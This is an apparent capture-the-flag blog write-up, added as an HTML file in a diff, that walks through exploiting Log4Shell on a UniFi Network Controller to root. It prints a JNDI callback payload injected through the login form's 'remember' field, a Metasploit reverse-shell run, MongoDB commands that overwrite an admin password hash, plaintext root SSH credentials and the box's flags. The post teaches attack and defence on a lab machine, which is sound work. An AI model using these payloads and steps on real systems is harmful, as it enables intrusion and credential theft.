@@ -1,0 +1,306 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="Log4Shell turned a login form into a reverse shell. A UniFi controller running version 6.4.54, a JNDI callback that shouldn't have worked, and root credentials stored in MongoDB site settings.">
+  <meta name="theme-color" content="#0a0a0f">
+  <title>Unified | Hack the Cube</title>
+
+  <meta property="og:title" content="Unified - Hack the Cube">
+  <meta property="og:description" content="Exploiting Log4Shell on a UniFi Network Controller to root. For science.">
+  <meta property="og:image" content="/blog/posts/unified/images/header.png">
+  <meta property="og:type" content="article">
+  <meta property="article:published_time" content="2026-04-27T00:00:00Z">
+
+  <link rel="stylesheet" href="/blog/assets/styles/blog.css">
+</head>
+<body>
+  <div class="blog-container">
+
+    <header style="padding: 1rem 0; border-bottom: 2px solid var(--border-dim); margin-bottom: 2rem;">
+      <a href="/blog/" style="display: flex; align-items: center; gap: 1rem; text-decoration: none;">
+        <span style="font-family: var(--font-pixel); font-size: 0.8rem; color: var(--terminal-green);">
+          &lt; HACK THE CUBE
+        </span>
+      </a>
+    </header>
+
+    <header class="post-header">
+      <h1 class="post-title">Unified</h1>
+
+      <div class="post-meta">
+        <div class="post-meta-item">
+          <span class="post-meta-label">Date:</span>
+          <span>April 27, 2026</span>
+        </div>
+        <div class="post-meta-item">
+          <span class="post-meta-label">Difficulty:</span>
+          <span class="post-difficulty easy">Easy</span>
+        </div>
+        <div class="post-meta-item">
+          <span class="post-meta-label">OS:</span>
+          <span>Linux</span>
+        </div>
+        <div class="post-meta-item solve-time">
+          <span class="post-meta-label">SOLVE TIME:</span>
+          <span class="time-value">~00:42:00</span>
+        </div>
+      </div>
+
+      <picture>
+        <source
+          type="image/webp"
+          srcset="/blog/posts/unified/images/header-800w.webp 800w,
+                 /blog/posts/unified/images/header-1200w.webp 1200w,
+                 /blog/posts/unified/images/header.webp 2048w"
+          sizes="(max-width: 800px) 100vw, 1200px"
+        >
+        <img
+          src="/blog/posts/unified/images/header.png"
+          alt="Unified - Log4Shell exploitation on a UniFi controller"
+          class="post-header-image"
+          loading="eager"
+          width="2048" height="1152"
+        >
+      </picture>
+
+      <div class="tags-container" style="justify-content: center;">
+        <a href="/blog/tags/tag.html?tag=machine" class="tag">machine</a>
+        <a href="/blog/tags/tag.html?tag=linux" class="tag">linux</a>
+        <a href="/blog/tags/tag.html?tag=easy" class="tag">easy</a>
+        <a href="/blog/tags/tag.html?tag=log4shell" class="tag">log4shell</a>
+        <a href="/blog/tags/tag.html?tag=cve" class="tag">cve</a>
+        <a href="/blog/tags/tag.html?tag=rce" class="tag">rce</a>
+        <a href="/blog/tags/tag.html?tag=mongodb" class="tag">mongodb</a>
+        <a href="/blog/tags/tag.html?tag=jndi" class="tag">jndi</a>
+        <a href="/blog/tags/tag.html?tag=metasploit" class="tag">metasploit</a>
+        <a href="/blog/tags/tag.html?tag=nmap" class="tag">nmap</a>
+        <a href="/blog/tags/tag.html?tag=glados" class="tag glados">glados</a>
+        <a href="/blog/tags/tag.html?tag=anger-core" class="tag anger-core">anger-core</a>
+        <a href="/blog/tags/tag.html?tag=fact-sphere" class="tag fact-sphere">fact-sphere</a>
+      </div>
+
+      <div class="post-characters">
+        <span class="post-meta-label">Guides:</span>
+        <span class="character-glados">GlaDOS</span>
+        <span class="character-anger-core">Anger Core</span>
+        <span class="character-fact-sphere">Fact Sphere</span>
+      </div>
+    </header>
+
+    <main class="post-content">
+
+      <h2>The Mission Briefing</h2>
+
+      <p>The target today was a Ubiquiti UniFi Network Controller. The kind of device that sits in server closets managing Wi-Fi access points, quietly running a web interface that nobody patches because "it's just the network controller, who's going to attack that?"</p>
+
+      <p>Everyone. Everyone is going to attack that. Especially when it's running a version of Log4j that made the entire internet collectively panic in December 2021.</p>
+
+      <div class="dialogue glados">
+        <div class="dialogue-speaker">GlaDOS</div>
+        <div class="dialogue-text">"Today's test chamber features CVE-2021-44228. You may know it as Log4Shell. The vulnerability that proved, conclusively, that logging user input without sanitization is... inadvisable. The entire software industry learned this lesson simultaneously. Some of them even applied the patch."</div>
+      </div>
+
+      <p>GlaDOS had a point. This was Adventure Mode on an Easy box, but Log4Shell is anything but trivial in the real world. Time to see how a $2 billion networking company's product held up against the most famous CVE in recent memory.</p>
+
+      <h2>Reconnaissance</h2>
+
+      <p>I started where I always start: a full port scan to see what the target was running.</p>
+
+      <div class="terminal-log">
+nmap -sC -sV -p- 10.129.96.149
+
+PORT     STATE SERVICE         VERSION
+22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.3
+6789/tcp open  ibm-db2-admin?
+8080/tcp open  http-proxy      (redirects to https://10.129.96.149:8443/manage)
+8443/tcp open  ssl/nagios-nsca  UniFi Network (Ubiquiti Inc.)
+8843/tcp open  ssl/unknown      UniFi secondary
+8880/tcp open  cddbp-alt?       UniFi HTTP
+SSL cert: commonName=UniFi, organizationName=Ubiquiti Inc.
+      </div>
+
+      <p>Six open ports. SSH on 22, and then a cluster of ports in the 6000-8000 range that all pointed to one thing: a UniFi Network Controller. Port 8080 helpfully redirected to the HTTPS management interface on 8443, where a login page was waiting.</p>
+
+      <div class="dialogue fact-sphere">
+        <div class="dialogue-speaker">Fact Sphere</div>
+        <div class="dialogue-text">"The UniFi Network Controller uses port 8080 for device inform communication, 8443 for the HTTPS management portal, 8843 for guest portal HTTPS, and 8880 for guest portal HTTP. Port 6789 is the UniFi mobile speed test port. This is a standard deployment with no ports disabled. The correlation between default configurations and security incidents is... considerable."</div>
+      </div>
+
+      <p>With the management portal identified, the next question was obvious: what version is it running?</p>
+
+      <div class="terminal-log">
+curl -sk https://10.129.96.149:8443/status
+
+{"meta":{"rc":"ok","up":true,"server_version":"6.4.54","uuid":"8918a2b4-6f90-4f13-8233-e29085bd16d7"},"data":[]}
+      </div>
+
+      <p>Version 6.4.54. I didn't even need to check -- I already knew what that meant. Log4Shell was patched in UniFi version 6.5.55. This controller was one version behind the fix.</p>
+
+      <h2>The Vulnerability</h2>
+
+      <p>CVE-2021-44228 -- Log4Shell -- is a remote code execution vulnerability in Apache Log4j 2, the ubiquitous Java logging library. The flaw is deceptively simple: Log4j supports JNDI (Java Naming and Directory Interface) lookups in log messages. If an attacker can get a string like <code>${jndi:ldap://attacker.com/payload}</code> into a log message, Log4j will dutifully reach out to the attacker's server, download a Java class, and execute it.</p>
+
+      <p>The UniFi controller logs the <code>remember</code> parameter from login requests. Which means I could inject a JNDI payload through the login form without even needing valid credentials.</p>
+
+      <div class="dialogue anger-core">
+        <div class="dialogue-speaker">Anger Core</div>
+        <div class="dialogue-text">"THEY. LOG. USER. INPUT. AND. RESOLVE. IT. AS. CODE."</div>
+      </div>
+
+      <p>Before going for full exploitation, I verified the vulnerability was actually triggerable. I set up a tcpdump listener for LDAP traffic and sent a JNDI payload in the login form's <code>remember</code> field.</p>
+
+      <div class="terminal-log">
+sudo tcpdump -i tun0 port 389 -n &
+curl -sk -X POST https://10.129.96.149:8443/api/login -H 'Content-Type: application/json' -d '{"username":"test","password":"test","remember":"${jndi:ldap://10.10.14.16:389/test}","strict":true}'
+
+12:15:11.677519 IP 10.129.96.149.35546 > 10.10.14.16.389: Flags [S], seq 1977579353, win 64240, ...
+12:15:11.677564 IP 10.10.14.16.389 > 10.129.96.149.35546: Flags [R.], seq 0, ack 1977579354, win 0, length 0
+      </div>
+
+      <p>There it was. The target reached out to my machine on port 389 -- an LDAP connection attempt triggered by the JNDI lookup. The vulnerability was confirmed. The UniFi controller was parsing my malicious string from the login form and executing the JNDI lookup, just as the CVE described.</p>
+
+      <div class="dialogue glados">
+        <div class="dialogue-speaker">GlaDOS</div>
+        <div class="dialogue-text">"The target has confirmed its vulnerability by reaching out to touch the hot stove you placed in front of it. How... obliging. You may now proceed to the part where you set the entire kitchen on fire."</div>
+      </div>
+
+      <h2>Initial Foothold</h2>
+
+      <p>With the vulnerability confirmed, I turned to Metasploit. The <code>ubiquiti_unifi_log4shell</code> module handles the entire exploitation chain: it spins up a malicious LDAP server, serves a crafted Java class that establishes a reverse shell, and triggers the whole thing through the vulnerable login endpoint.</p>
+
+      <div class="terminal-log">
+sudo msfconsole -q -r /tmp/unified_exploit.rc
+# RHOSTS=10.129.96.149, LHOST=10.10.14.16, LPORT=4444, SRVHOST=10.10.14.16, SRVPORT=1389, target=Unix
+
+[+] The target is vulnerable.
+[+] Delivering the serialized Java object to execute the payload...
+[*] Command shell session 1 opened (10.10.14.16:4444 -> 10.129.96.149:34144)
+      </div>
+
+      <p>A reverse shell as the <code>unifi</code> user (uid=999). The exploit chain worked exactly as expected: the JNDI payload in the login form triggered an LDAP lookup to my server, which responded with a serialized Java object containing a reverse shell payload. Log4j deserialized it, executed it, and now I had a shell.</p>
+
+      <h2>User Flag</h2>
+
+      <p>With shell access, the user flag was sitting in michael's home directory.</p>
+
+      <div class="terminal-log">
+cat /home/michael/user.txt
+
+6ced1a6a89e666c0620cdb10262ba127
+      </div>
+
+      <p>User flag: <span class="flag-spoiler" onclick="this.classList.toggle('revealed')"><span class="flag-hidden">The flag is a lie</span><span class="flag-revealed">6ced1a6a89e666c0620cdb10262ba127</span></span></p>
+
+      <h2>Privilege Escalation</h2>
+
+      <p>I was running as the <code>unifi</code> service account. Not root, not even a regular user. But I had something better than a privilege escalation exploit -- I had access to the UniFi controller's database.</p>
+
+      <p>UniFi stores its configuration in MongoDB, and on this box, MongoDB was running locally on port 27117. No authentication required. I queried the <code>ace</code> database for admin accounts.</p>
+
+      <div class="terminal-log">
+mongo --port 27117 --quiet --eval 'db = db.getSiblingDB("ace"); db.admin.find({},{name:1,email:1,x_shadow:1}).forEach(printjson)'
+
+5 admin accounts found: administrator, michael, Seamus, warren, james
+All passwords are SHA-512 ($6$) hashes
+      </div>
+
+      <p>Five admin accounts, all with SHA-512 hashes. Cracking SHA-512 takes time. But who said anything about cracking?</p>
+
+      <div class="dialogue glados">
+        <div class="dialogue-speaker">GlaDOS</div>
+        <div class="dialogue-text">"Why spend cycles breaking a lock when you can simply replace it with one you already have the key to? This is the kind of lateral thinking that separates adequate test subjects from truly disappointing ones."</div>
+      </div>
+
+      <p>I replaced the administrator's password hash in MongoDB with a known value -- the SHA-512 hash of "password123".</p>
+
+      <div class="terminal-log">
+mongo --port 27117 --quiet --eval 'db = db.getSiblingDB("ace"); db.admin.updateOne({name:"administrator"}, {$set: {x_shadow: "&lt;sha512 hash of password123&gt;"}})'
+
+{ "acknowledged" : true, "matchedCount" : 1, "modifiedCount" : 1 }
+      </div>
+
+      <p>With the password changed, I logged into the UniFi web portal as administrator and navigated to the site settings. UniFi controllers have a feature for managing SSH credentials on network devices. And there, stored in plaintext in the site configuration, was the root password.</p>
+
+      <div class="terminal-log">
+curl -sk -X POST https://10.129.96.149:8443/api/login -H 'Content-Type: application/json' -d '{"username":"administrator","password":"password123"}' -c /tmp/unifi_cookies.txt
+curl -sk -b /tmp/unifi_cookies.txt https://10.129.96.149:8443/api/s/default/get/setting | grep -A5 ssh
+
+"x_ssh_enabled": true,
+"x_ssh_username": "root",
+"x_ssh_password": "NotACrackablePassword4U2022",
+      </div>
+
+      <div class="dialogue anger-core">
+        <div class="dialogue-speaker">Anger Core</div>
+        <div class="dialogue-text">"THE ROOT SSH PASSWORD. STORED IN PLAINTEXT. IN A WEB APPLICATION'S DATABASE. CALLED 'NotACrackablePassword.' I AM GOING TO NEED A MOMENT."</div>
+      </div>
+
+      <h2>Root</h2>
+
+      <p>With SSH credentials for root in hand, the final step was trivial.</p>
+
+      <div class="terminal-log">
+sshpass -p 'NotACrackablePassword4U2022' ssh root@10.129.96.149 "id && cat /root/root.txt"
+
+uid=0(root) gid=0(root) groups=0(root)
+e50bc93c75b634e4b272d2f771c33681
+      </div>
+
+      <p>Root flag: <span class="flag-spoiler" onclick="this.classList.toggle('revealed')"><span class="flag-hidden">The flag is a lie</span><span class="flag-revealed">e50bc93c75b634e4b272d2f771c33681</span></span></p>
+
+      <h2>What I Learned</h2>
+
+      <ul>
+        <li><strong>Log4Shell (CVE-2021-44228)</strong> exploits JNDI lookups in Log4j to achieve remote code execution. Any user-controlled input that gets logged can become an attack vector -- in this case, a login form's "remember me" parameter.</li>
+        <li><strong>Version disclosure</strong> through status endpoints (<code>/status</code>) makes it trivial for attackers to confirm whether a target is vulnerable before even attempting exploitation.</li>
+        <li><strong>MongoDB without authentication</strong> on a local port gave me full read/write access to the application's database. I didn't need to crack password hashes -- I just replaced them.</li>
+        <li><strong>Credential storage in application databases</strong> is a recurring pattern. UniFi stored SSH root credentials in its site settings, turning a web application compromise into full system access.</li>
+        <li><strong>Defense in depth matters.</strong> If any single layer had been hardened -- patching Log4j, requiring MongoDB authentication, not storing SSH credentials in the web app -- the full chain would have broken.</li>
+      </ul>
+
+      <div class="dialogue glados">
+        <div class="dialogue-speaker">GlaDOS</div>
+        <div class="dialogue-text">"From a login form to root in forty-two minutes. The vulnerability chain was: unpatched software, unauthenticated database, plaintext credentials. Three failures, each one individually fixable, collectively catastrophic. I trust you see the pattern. It's the same pattern as every other test chamber. The humans never learn. But you might. Dismissed."</div>
+      </div>
+
+      <div class="dialogue fact-sphere">
+        <div class="dialogue-speaker">Fact Sphere</div>
+        <div class="dialogue-text">"CVE-2021-44228 received a CVSS score of 10.0 -- the maximum possible severity rating. The Apache Software Foundation released the initial patch in Log4j 2.15.0 on December 6, 2021. Ubiquiti patched UniFi Network Controller in version 6.5.55. The number of affected systems worldwide was estimated at over 3 billion Java instances. This is, technically, a fact."</div>
+      </div>
+
+    </main>
+
+    <aside class="attack-path">
+      <h3>Attack Path Summary</h3>
+      <ol>
+        <li>Port scan revealed <strong>UniFi Network Controller</strong> on ports 8080/8443/8843/8880</li>
+        <li><strong>/status</strong> endpoint disclosed version <strong>6.4.54</strong> (vulnerable to <strong>Log4Shell CVE-2021-44228</strong>)</li>
+        <li><strong>JNDI callback test</strong> confirmed vulnerability via <strong>tcpdump</strong></li>
+        <li>Exploited <strong>Log4Shell</strong> using <strong>Metasploit ubiquiti_unifi_log4shell</strong> module for reverse shell as <strong>unifi</strong> (uid=999)</li>
+        <li>Read user flag from <strong>/home/michael/user.txt</strong></li>
+        <li>Queried local <strong>MongoDB</strong> (port 27117) for UniFi admin credentials</li>
+        <li>Replaced administrator password hash in <strong>MongoDB</strong> with known value</li>
+        <li>Logged into UniFi web portal and extracted SSH credentials from site settings: <strong>root:NotACrackablePassword4U2022</strong></li>
+        <li>SSH as <strong>root</strong> for root flag</li>
+      </ol>
+    </aside>
+
+    <nav class="post-nav">
+      <a href="/blog/posts/repetitive/" class="post-nav-link prev">Repetitive</a>
+      <span></span>
+    </nav>
+
+    <footer class="blog-footer">
+      <p class="footer-text">
+        <a href="/blog/" class="footer-link">Back to Test Chamber Archives</a>
+      </p>
+      <p class="footer-text" style="font-size: 0.8rem; color: var(--text-dim);">
+        For science. You monster.
+      </p>
+    </footer>
+
+  </div>
+</body>
+</html>
